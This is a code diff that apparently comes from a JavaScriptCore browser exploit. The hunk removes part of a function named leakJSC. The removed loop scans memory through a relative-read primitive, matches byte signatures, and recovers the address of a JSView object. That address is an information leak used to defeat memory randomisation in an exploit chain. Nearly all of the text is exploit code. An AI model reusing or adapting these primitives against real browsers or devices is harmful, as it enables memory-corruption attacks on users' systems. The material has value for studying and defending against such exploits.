@@ -235,48 +235,6 @@ function leakJSC() {
 
 	/* 
 	 * /!\
-	 * This part must avoid as much as possible fastMalloc allocation
-	 * to avoid re-using the targeted object 
-	 * /!\ 
-	 */
-	/* Use relative read to find our JSC obj */
-	/* We want a JSView that is allocated after our relative read */
-	while (g_jsview_leak === null) {
-		Object.defineProperties({}, props);
-		for (let i = 0; i < 0x800000; i++) {
-			var v = undefined;
-			if (g_relative_read.charCodeAt(i) === 0x42 &&
-				g_relative_read.charCodeAt(i + 0x01) === 0x42 &&
-				g_relative_read.charCodeAt(i + 0x02) === 0x42 &&
-				g_relative_read.charCodeAt(i + 0x03) === 0x42) {
-				if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
-					g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
-					g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
-					g_relative_read.charCodeAt(i + 0x3f) === 0x00)
-					v = new Int64(str2array(g_relative_read, 9, i + 0x20));
-				else if (g_relative_read.charCodeAt(i + 0x10) === 0x42 &&
-					g_relative_read.charCodeAt(i + 0x11) === 0x42 &&
-					g_relative_read.charCodeAt(i + 0x12) === 0x42 &&
-					g_relative_read.charCodeAt(i + 0x13) === 0x42)
-					v = new Int64(str2array(g_relative_read, 9, i + 9));
-			}
-			if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
-				g_jsview_leak = v;
-				props = null;
-				break;
-			}
-		}
-	}
-	/* 
-	 * /!\
 	 * Critical part ended-up here
 	 * /!\ 
 	 */
